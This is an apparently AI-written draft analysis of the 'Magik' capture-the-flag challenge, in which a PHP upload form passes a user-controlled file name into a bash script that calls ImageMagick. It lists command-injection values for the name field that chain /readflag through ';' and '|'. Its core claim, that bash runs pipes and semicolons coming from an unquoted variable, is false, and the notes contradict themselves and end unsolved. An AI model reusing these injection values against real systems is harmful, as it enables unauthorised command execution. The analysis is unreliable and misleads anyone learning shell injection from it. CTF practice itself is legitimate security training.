# Magik - Detailed Technical Analysis

## Command Flow

### 1. PHP Layer (index.php)
```php
proc_open([
    '/opt/convert.sh',
    $_FILES['img']['tmp_name'],       // $1 = /tmp/phpXXXXXX
    'static/' . $_POST['name'] . '.png'  // $2 = static/<NAME>.png
], [], $pipes)
```

**Key Point**: `proc_open()` with array does NOT invoke shell.
- Arguments are passed directly to `/opt/convert.sh`
- No shell expansion, no pipe interpretation at this level

### 2. Bash Script Layer (convert.sh)
```bash
#!/bin/bash
set -x
convert $1 -resize 64x64 -background none -gravity center -extent 64x64 $2
find . -type f -exec exiftool -overwrite_original -all= {} + >/dev/null 2>&1 || true
```

**CRITICAL**: `$1` and `$2` are UNQUOTED!

When bash sees:
```bash
convert $1 ... $2
```

And `$2 = "static/x.png |/readflag>output /app/test"`

Bash performs word-splitting on `$2`, resulting in:
```bash
convert /tmp/php... -resize 64x64 ... static/x.png |/readflag>output /app/test
```

**HOWEVER**: The pipe `|` here is interpreted by bash as a SHELL PIPE, not as a string!

Wait, let me reconsider...

## Correct Analysis

When `proc_open()` executes with array:
```
execve("/opt/convert.sh", ["/opt/convert.sh", "/tmp/phpXXX", "static/name.png"], env)
```

Inside convert.sh:
- `$1 = /tmp/phpXXX`
- `$2 = static/name.png` (where name comes from POST)

If name = `x.png |/readflag>output /app/test`, then:
- `$2 = static/x.png |/readflag>output /app/test.png`

When bash executes `convert $1 ... $2` (unquoted):
```bash
convert /tmp/phpXXX -resize 64x64 -background none -gravity center -extent 64x64 static/x.png |/readflag>output /app/test.png
```

Bash DOES interpret the pipe because `$2` is unquoted!

## Test Cases

###  Case 1: Pipe
- Input name: `x.png |/readflag>static/flag /app/out`
- $2 becomes: `static/x.png |/readflag>static/flag /app/out.png`
- Bash executes:
  ```bash
  convert /tmp/... ... static/x.png | /readflag > static/flag /app/out.png
  ```
- Result: convert outputs to pipe, /readflag reads from stdin (image data), writes to static/flag
- Issue: /readflag doesn't use stdin, so this fails

### Case 2: Semicolon
- Input name: `x.png; /readflag > flag.txt; y`
- $2 becomes: `static/x.png; /readflag > flag.txt; y.png`
- Bash executes:
  ```bash
  convert ... static/x.png  # First command
  /readflag > flag.txt       # Second command
  y.png                      # Third command (fails)
  ```
- Result: /readflag SHOULD execute and write to flag.txt in CURRENT DIRECTORY

### Current Directory
convert.sh doesn't change directory, so it runs in `/app` (WORKDIR from Dockerfile).

## File Access Problem

Files created in `/app` should be accessible via `http://host/filename`.

PHP built-in server serves from `/app`:
```
CMD ["php", "-S", "0.0.0.0:8000", "-t", "/app"]
```

When accessing `http://host/flag.txt`:
- PHP server looks for `/app/flag.txt`
- If not found, routes to `/app/index.php` (router script)
- index.php shows source code when no POST data

**Hypothesis**: Files ARE being created, but PHP's built-in server has routing that sends all requests to index.php.

## Solution Path

Need to either:
1. Write to a location that bypasses PHP routing (unlikely)
2. Exploit the PHP router itself
3. Use a different output method
4. Check if there's a `.htaccess` or similar configuration

## Next Steps
1. Test semicolon injection more carefully
2. Check if files are actually created (use ls command)
3. Try writing to known-accessible paths
4. Investigate PHP built-in server routing behavior
